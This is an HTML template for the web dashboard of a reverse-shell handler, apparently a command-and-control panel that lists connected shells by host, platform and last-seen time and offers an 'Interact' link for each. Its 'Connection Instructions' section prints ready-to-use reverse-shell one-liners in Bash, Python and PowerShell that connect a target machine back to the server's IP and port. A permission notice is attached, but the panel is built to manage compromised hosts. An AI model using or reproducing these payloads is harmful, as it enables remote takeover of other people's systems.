{% extends 'base.html' %}
{% block title %}Reverse Shells{% endblock %}
{% block content %}
<section class="card">
  <div class="card-header">
    <h2>Reverse Shell Connections</h2>
    <div class="toolbar">
      <button id="refresh-btn" class="btn ghost" style="padding: 0.5rem 1rem;">
        <span style="font-size: 1.2em;">üîÑ</span> Refresh
      </button>
      <button id="auto-refresh-toggle" class="btn ghost" style="padding: 0.5rem 1rem;" data-enabled="false">
        <span style="font-size: 1.2em;">‚è∞</span> Auto-Refresh: OFF
      </button>
      <a href="{{ url_for('main.export_shell_executions') }}" class="btn ghost">Export History CSV</a>
    </div>
  </div>

  <!-- Filters Bar -->
  <div style="background: #f5f5f5; padding: 1rem; border-bottom: 1px solid #ddd;">
    <form method="GET" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 0.5rem; align-items: end;">
      <div>
        <label style="display: block; margin-bottom: 0.25rem; font-size: 0.9em; font-weight: 500;">Group</label>
        <select name="group" class="form-control" style="width: 100%; padding: 0.4rem;">
          <option value="">All Groups</option>
          {% for group in all_groups %}
          <option value="{{ group }}" {% if current_filters.group == group %}selected{% endif %}>
            {{ group }}
          </option>
          {% endfor %}
        </select>
      </div>
      
      <div>
        <label style="display: block; margin-bottom: 0.25rem; font-size: 0.9em; font-weight: 500;">Platform</label>
        <select name="platform" class="form-control" style="width: 100%; padding: 0.4rem;">
          <option value="">All Platforms</option>
          {% for platform in all_platforms %}
          <option value="{{ platform }}" {% if current_filters.platform == platform %}selected{% endif %}>
            {{ platform }}
          </option>
          {% endfor %}
        </select>
      </div>
      
      <div>
        <label style="display: block; margin-bottom: 0.25rem; font-size: 0.9em; font-weight: 500;">Status</label>
        <select name="status" class="form-control" style="width: 100%; padding: 0.4rem;">
          <option value="">All Status</option>
          <option value="active" {% if current_filters.status == 'active' %}selected{% endif %}>Online</option>
          <option value="disconnected" {% if current_filters.status == 'disconnected' %}selected{% endif %}>Offline</option>
        </select>
      </div>
      
      <div>
        <label style="display: block; margin-bottom: 0.25rem; font-size: 0.9em; font-weight: 500;">Search</label>
        <input type="text" name="search" class="form-control" style="width: 100%; padding: 0.4rem;"
               placeholder="IP, hostname, user..." 
               value="{{ current_filters.search }}">
      </div>
      
      <div style="display: flex; gap: 0.5rem;">
        <button type="submit" class="btn" style="padding: 0.4rem 1rem; flex: 1;">
          üîç Filter
        </button>
        <a href="{{ url_for('main.shells_dashboard') }}" class="btn ghost" style="padding: 0.4rem 1rem; flex: 1;">
          ‚úñ Clear
        </a>
      </div>
    </form>
  </div>

  <table>
    <thead>
      <tr>
        <th>Status</th>
        <th>Name</th>
        <th>Address</th>
        <th>Group</th>
        <th>Platform</th>
        <th>Hostname</th>
        <th>Last Seen</th>
        <th>Actions</th>
      </tr>
    </thead>
    <tbody>
      {% for shell in shells %}
      <tr>
        <td>
          {% if shell.id in active_shell_ids %}
          <span class="pill success">‚óè Connected</span>
          {% else %}
          <span class="pill failed">‚óã Disconnected</span>
          {% endif %}
        </td>
        <td><strong>{{ shell.name }}</strong></td>
        <td><code>{{ shell.address }}:{{ shell.port }}</code></td>
        <td>{{ shell.group_name }}</td>
        <td>{{ shell.platform or 'Unknown' }}</td>
        <td>{{ shell.hostname or '-' }}</td>
        <td>
          {% if shell.last_seen %}
          {{ shell.last_seen.strftime('%Y-%m-%d %H:%M:%S') }}
          {% else %}
          Never
          {% endif %}
        </td>
        <td>
          <a href="{{ url_for('main.shell_detail', shell_id=shell.id) }}" class="btn ghost" style="padding: 0.3rem 0.6rem;">
            {% if shell.id in active_shell_ids %}Interact{% else %}View{% endif %}
          </a>
          {% if current_user.role == 'admin' %}
          <a href="{{ url_for('main.edit_shell', shell_id=shell.id) }}" class="btn ghost" style="padding: 0.3rem 0.6rem;">Edit</a>
          {% endif %}
        </td>
      </tr>
      {% else %}
      <tr><td colspan="8">No reverse shells found. {% if current_filters.group or current_filters.platform or current_filters.status or current_filters.search %}Try adjusting your filters.{% else %}Configure your agents to connect to port {{ shell_port }}.{% endif %}</td></tr>
      {% endfor %}
    </tbody>
  </table>

  <div class="pagination-row">
    {% if has_prev %}
    <a class="btn ghost" href="{{ url_for('main.shells_dashboard', page=page-1, group=current_filters.group, platform=current_filters.platform, status=current_filters.status, search=current_filters.search) }}">Prev</a>
    {% endif %}
    <span>Page {{ page }} / {{ total_pages }}</span>
    {% if has_next %}
    <a class="btn ghost" href="{{ url_for('main.shells_dashboard', page=page+1, group=current_filters.group, platform=current_filters.platform, status=current_filters.status, search=current_filters.search) }}">Next</a>
    {% endif %}
  </div>
</section>

<section class="card" style="margin-top: 1rem;">
  <h3>Connection Instructions</h3>
  <p>To connect a reverse shell to this server, use one of the following methods:</p>
  
  {% if connection_ip %}
  <div style="margin: 1rem 0; padding: 0.75rem; background: #e8f5e9; border-left: 4px solid #4caf50;">
    <strong>üì° Server IP:</strong> 
    <code style="background: #fff; padding: 0.25rem 0.5rem; border-radius: 3px;">{{ connection_ip }}:{{ shell_port }}</code>
    {% if public_ip and local_ip and public_ip != local_ip %}
    <br><small style="margin-top: 0.5rem; display: block;">
      üí° Public IP: <code>{{ public_ip }}</code> | Local IP: <code>{{ local_ip }}</code>
    </small>
    {% endif %}
  </div>
  {% endif %}
  
  <div style="margin-top: 1rem;">
    <strong>Linux/macOS (Bash):</strong>
    <pre>bash -i >& /dev/tcp/{{ connection_ip or 'YOUR_SERVER_IP' }}/{{ shell_port }} 0>&1</pre>
  </div>
  
  <div style="margin-top: 1rem;">
    <strong>Python:</strong>
    <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{ connection_ip or 'YOUR_SERVER_IP' }}",{{ shell_port }}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</pre>
  </div>
  
  <div style="margin-top: 1rem;">
    <strong>PowerShell (Windows):</strong>
    <pre>$client = New-Object System.Net.Sockets.TCPClient("{{ connection_ip or 'YOUR_SERVER_IP' }}",{{ shell_port }});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
  </div>
  
  <p style="margin-top: 1rem; color: #d9534f;">
    <strong>‚ö† Security Notice:</strong> These reverse shells should only be used on systems you own or have explicit permission to access. 
    Unauthorized access to computer systems is illegal.
  </p>
</section>

<script>
// Auto-refresh functionality
let autoRefreshInterval = null;

document.getElementById('refresh-btn').addEventListener('click', () => {
  location.reload();
});

document.getElementById('auto-refresh-toggle').addEventListener('click', function() {
  const enabled = this.dataset.enabled === 'true';
  
  if (enabled) {
    // Disable auto-refresh
    clearInterval(autoRefreshInterval);
    this.dataset.enabled = 'false';
    this.innerHTML = '<span style="font-size: 1.2em;">‚è∞</span> Auto-Refresh: OFF';
    this.classList.remove('success');
    this.classList.add('ghost');
  } else {
    // Enable auto-refresh (every 5 seconds)
    autoRefreshInterval = setInterval(() => location.reload(), 5000);
    this.dataset.enabled = 'true';
    this.innerHTML = '<span style="font-size: 1.2em;">‚è∞</span> Auto-Refresh: ON';
    this.classList.remove('ghost');
    this.classList.add('success');
  }
});
</script>
{% endblock %}
